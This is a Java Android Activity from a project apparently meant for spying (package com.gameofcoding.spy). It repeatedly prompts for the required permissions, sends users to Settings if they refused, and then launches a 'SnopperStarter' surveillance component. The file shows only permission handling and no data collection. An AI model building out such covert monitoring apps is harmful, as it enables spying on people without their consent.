package com.gameofcoding.spy.activities;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.spys.SnopperStarter;
import com.gameofcoding.spy.utils.AppConstants;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;

public class SnopperStarterActivity extends Activity {
    private static final String TAG = "SnopperStarterActivity";
    private static final int PERMISSIONS_REQUEST_CODE = AppConstants.PERMISSIONS_REQUEST_CODE;
    private static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private Utils mUtils;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_spystarter);
	mUtils = new Utils(this);
	startSnopper();
    }


    public void startSnopper() {
   	if(mUtils.hasPermissions()) {
	    XLog.d(TAG, "All permissions granted, directly starting 'SnopperStarter'");
	    new SnopperStarter(this).start();
	    setResult(RESULT_OK);
	    finish();
	} else {
	    XLog.d(TAG, "All permissions are not granted, prompting for permission grant");
	    grantPermissions();
	}
    }
    
    public boolean grantPermissions() {
	if(!mUtils.hasPermissions()) {
	    requestPermissions(AppConstants.PERMISSIONS_NEEDED,
			       PERMISSIONS_REQUEST_CODE);
	    return false;
	}
	return true;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
	super.onRequestPermissionsResult(requestCode, permissions, grantResults);
	switch(requestCode) {
	case PERMISSIONS_REQUEST_CODE:
	    handlePermissionResult();
	    break;
	}
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	super.onActivityResult(requestCode, resultCode, data);
	switch(requestCode) {
	case OPEN_SETTINGS_REQUEST_CODE:
	    handlePermissionResult();
	    break;
	}
    }

    private void handlePermissionResult() {
	for(String permission : AppConstants.PERMISSIONS_NEEDED) {
	    if(mUtils.hasPermission(permission))
		// User granted this permission, check for next one
		continue;
	    // User not granted permission
	    AlertDialog.Builder permissionRequestDialog = new AlertDialog.Builder(this)
		.setTitle(R.string.dialog_permission_title)
		.setMessage(R.string.dialog_permission_message)
		.setCancelable(false)
		.setNegativeButton(R.string.exit,
				   new DialogInterface.OnClickListener() {
				       @Override
				       public void onClick(DialogInterface dialog, int whichButton) {
					   mUtils.showToast("Closing app...");
					   setResult(RESULT_CANCELED);
					   finish();
				       }
				   });
	    if(!shouldShowRequestPermissionRationale(permission)) {
		// User clicked on "Don't ask again", show dialog to navigate him to
		// settings
		permissionRequestDialog
		    .setPositiveButton(R.string.go_to_settings,
				       new DialogInterface.OnClickListener() {
					   @Override
					   public void onClick(DialogInterface dialog,
							       int whichButton) {
					       Intent intent =
						   new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
					       Uri uri =
						   Uri.fromParts("package", getPackageName(), null);
					       intent.setData(uri);
					       startActivityForResult(intent,
								      OPEN_SETTINGS_REQUEST_CODE);
					   }
				       })
		    .show();
	    } else {
		permissionRequestDialog
		    .setPositiveButton(R.string.try_again,
				       new DialogInterface.OnClickListener() {
					   @Override
					   public void onClick(DialogInterface dialog,
							       int whichButton) {
					       grantPermissions();
					   }
				       })
		    .show();
	    }
	    return;
	}
	startSnopper();
    }
}
